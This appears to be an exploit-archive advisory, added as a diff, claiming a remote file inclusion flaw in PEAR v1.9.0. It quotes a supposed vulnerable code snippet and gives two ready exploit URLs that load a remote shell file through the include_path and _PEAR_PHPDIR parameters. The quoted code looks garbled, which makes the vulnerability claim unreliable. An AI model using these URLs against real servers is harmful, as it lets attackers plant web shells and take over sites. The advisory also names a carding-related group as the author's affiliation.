@@ -1,0 +1,43 @@
+###########################################################
+###
+### PEAR v.1.9.0 Multiple Remote File Inclusion Vulnerability
+##
+###########################################################
+###     PEAR, the PHP Extension and Application Repository
+###
+###     * @package        PEAR
+###     * @Version        v.1.9.0
+###     * @license        http://opensource.org/licenses/bsd-license.php New BSD License
+###     * @link           http://pear.php.net/package/PEAR
+###
+###########################################################
+###
+###     Type :  Remote File Inclusion Vulnerability
+###     Author: eidelweiss
+###     Date  : 2010-02-14
+###     Location:       Indonesia ( http://yogyacarderlink.web.id )
+###     Contact:        g1xsystem [at] windowslive [dot] com
+###     Greetz : AL-MARHUM - YOGYACARDERLINK TEAM - (D)eal (C)yber
+###
+###########################################################
+###
+###     Vuln:   if ('../DIRECTORY_SEPARATOR/PEAR' != '@'.'include_path'.'@') {
+###                     ini_set('include_path', '../DIRECTORY_SEPARATOR/PEAR');
+###                     $raw = true;
+###             }
+###             @ini_set('allow_url_fopen', true);
+###             if (!ini_get('safe_mode')) {
+###             @set_time_limit(0);
+###             }
+###     $_PEAR_PHPDIR = '#$%^&*';
+###             define('PEAR_RUNTYPE', 'pecl');
+###             require_once 'pearcmd.php';
+###             require_once 'PEAR.php';
+###             require_once 'PEAR/Frontend.php';
+###             require_once 'PEAR/Config.php';
+###             require_once 'PEAR/Command.php';
+###             require_once 'Console/Getopt.php';
+###     =========================================================
+###     exploit:        http://victim.com/[DIRECTORY_SEPARATOR]/PEAR_DIR/PEAR.php?include_path=[Shell.txt?]
+###             http://victim.com/[DIRECTORY_SEPARATOR]/PEAR_DIR/PEAR.php?_PEAR_PHPDIR =[Shell.txt?]
+###########################################################
